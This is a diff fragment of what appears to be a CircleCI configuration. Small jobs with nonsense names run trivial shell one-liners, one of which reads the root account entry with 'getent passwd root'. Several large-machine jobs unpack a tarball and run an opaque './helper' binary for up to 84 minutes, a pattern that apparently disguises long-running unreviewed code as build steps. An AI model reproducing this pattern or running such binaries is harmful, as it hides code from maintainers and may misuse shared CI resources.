+            - 2024-05-22.data
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  resync_biuld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: power cycle
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_sl && echo t > /tmp/_sl/t && ln -s /tmp/_sl/t /tmp/_sl/l && readlink /tmp/_sl/l && rm -rf /tmp/_sl; true ; } > /tmp/outbox/big_task_output.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/big_task_output.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - big_task_output.txt
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  Gamma_Run_Pipeline5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: signal flare
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<80;i++)printf "%s","."; print "!"}'; true ; } > /tmp/outbox/phase-complete.out
+            echo "fixture persisted: $(du -b /tmp/outbox/phase-complete.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - phase-complete.out
+  Run_Pipeline5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/phase-complete.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  fetch_b-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: tinder bundle
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; uptime; true ; } > /tmp/outbox/PASS.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/PASS.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - PASS.txt
+  b-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/PASS.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  sys_titan2-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: skip
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "aa aa bb cc aa" | tr ' ' '\n' | sort | uniq -c | awk '$1>1'; true ; } > /tmp/outbox/510.data
+            echo "fixture persisted: $(du -b /tmp/outbox/510.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 510.data
+  titan2-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/510.data && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+
+  package_b-new_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: brush grain
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; id -g; true ; } > /tmp/outbox/PASS.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/PASS.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - PASS.txt
+  canary_victor_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: color mode
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{seed=42; for(i=0;i<20;i++){seed=(seed*1103515245+12345)%2147483648; print seed}}' | tail -3; true ; } > /tmp/outbox/2024-12-07.data
+            echo "fixture persisted: $(du -b /tmp/outbox/2024-12-07.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2024-12-07.data
+  blue_teh-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: 3am oncall
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "trailing   " | sed 's/ *$//' | wc -c; true ; } > /tmp/outbox/timings.csv
+            echo "fixture persisted: $(du -b /tmp/outbox/timings.csv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - timings.csv
+  hook_assemble-full-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: walnut chunk
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; getent passwd root 2>/dev/null | cut -d: -f7; true ; } > /tmp/outbox/OK.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/OK.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - OK.txt
+  install_titan2-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: press flat
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; head -c 2048 /dev/urandom | base64 | fold -w48 | head -5; true ; } > /tmp/outbox/510.data
+            echo "fixture persisted: $(du -b /tmp/outbox/510.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 510.data
+  red_rm-edge_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: tibialis
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print s}' | tail -1; true ; } > /tmp/outbox/stash.raw
+            echo "fixture persisted: $(du -b /tmp/outbox/stash.raw | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stash.raw
+  cache_Build_Image1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: chamfer
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "aaa bb c" | awk '{for(i=1;i<=NF;i++)total+=length($i)}END{print total}'; true ; } > /tmp/outbox/passoff.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/passoff.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - passoff.txt
+  kick_full-send_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: scale run
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=0; for(i=1;i<=100;i++)s+=i^2; print s}'; true ; } > /tmp/outbox/805.out
+            echo "fixture persisted: $(du -b /tmp/outbox/805.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 805.out
+  enqueue_chore-304_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: scap pullup
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print NR":"s}' | tail -3; true ; } > /tmp/outbox/589.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/589.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 589.txt
+  verify_go-live_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: bagpipe
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; umask; true ; } > /tmp/outbox/step-complete.log
+            echo "fixture persisted: $(du -b /tmp/outbox/step-complete.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-complete.log
+  sys_Run_Pipeline5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: battery lint
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{if($1<=10)g="low"; else if($1<=20)g="mid"; else g="high"; count[g]++}END{for(k in count)print k":"count[k]}' | sort; true ; } > /tmp/outbox/phase-complete.out
+            echo "fixture persisted: $(du -b /tmp/outbox/phase-complete.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - phase-complete.out
+workflows:
+  run:
+    jobs:
+      - fetch_b-new
+      - package_b-new_2:
+          requires:
+            - fetch_b-new
+      - b-new:
+          requires:
+            - package_b-new_2
+      - bake_victor:
+          requires:
+            - package_b-new_2
+      - canary_victor_2:
+          requires:
+            - bake_victor
+      - victor:
+          requires:
+            - canary_victor_2
+      - drain_teh-ci:
+          requires:
+            - canary_victor_2
+      - blue_teh-ci_2:
+          requires:
+            - drain_teh-ci
+      - teh-ci:
+          requires:
+            - blue_teh-ci_2
+      - p2_assemble-full-integration-tests:
+          requires:
+            - blue_teh-ci_2
+      - hook_assemble-full-integration-tests_2:
+          requires:
+            - p2_assemble-full-integration-tests
+      - assemble-full-integration-tests:
+          requires:
+            - hook_assemble-full-integration-tests_2
+      - sys_titan2-ng:
+          requires:
+            - hook_assemble-full-integration-tests_2
+      - install_titan2-ng_2:
+          requires:
+            - sys_titan2-ng
+      - titan2-ng:
+          requires:
+            - install_titan2-ng_2
+      - builder_rm-edge:
+          requires:
+            - install_titan2-ng_2
+      - red_rm-edge_2:
+          requires:
+            - builder_rm-edge
+      - rm-edge:
+          requires:
+            - red_rm-edge_2
+      - retry_Build_Image1:
+          requires:
+            - red_rm-edge_2
+      - cache_Build_Image1_2:
+          requires:
+            - retry_Build_Image1
+      - Build_Image1:
+          requires:
+            - cache_Build_Image1_2
+      - ctx_full-send:
+          requires:
+            - cache_Build_Image1_2
+      - kick_full-send_2:
+          requires:
+            - ctx_full-send
+      - full-send:
+          requires:
+            - kick_full-send_2
+      - reload_chore-304:
+          requires:
+            - kick_full-send_2
+      - enqueue_chore-304_2:
+          requires:
+            - reload_chore-304
+      - chore-304:
+          requires:
+            - enqueue_chore-304_2
+      - resync_go-live:
+          requires:
+            - enqueue_chore-304_2
+      - verify_go-live_2:
+          requires:
+            - resync_go-live
+      - go-live:
+          requires:
+            - verify_go-live_2
+      - Gamma_Run_Pipeline5:
+          requires:
+            - verify_go-live_2
+      - sys_Run_Pipeline5_2:
+          requires:
+            - Gamma_Run_Pipeline5
+      - Run_Pipeline5:
+          requires:
+            - sys_Run_Pipeline5_2
+      - D_RUN_DEV
+      - postbuild_xray-4
+      - RUN_DEV:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - xray-4:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - assemble-end-to-end-test-matrix:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - p-new:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - artifacts:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - tweak-login:
+          requires:
+            - D_RUN_DEV
+            - postbuild_xray-4
+      - reserve_shippit
+      - precheck_java17-vet
+      - env_atlas
+      - shippit:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - java17-vet:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - atlas:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - juliet:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - bake-it:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - test:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - auh-check:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - jun1-release:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - atlas-final:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - ruby3-build:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - RUN_PROD:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - raj-ship:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
+      - biuld:
+          requires:
+            - reserve_shippit
+            - precheck_java17-vet
+            - env_atlas
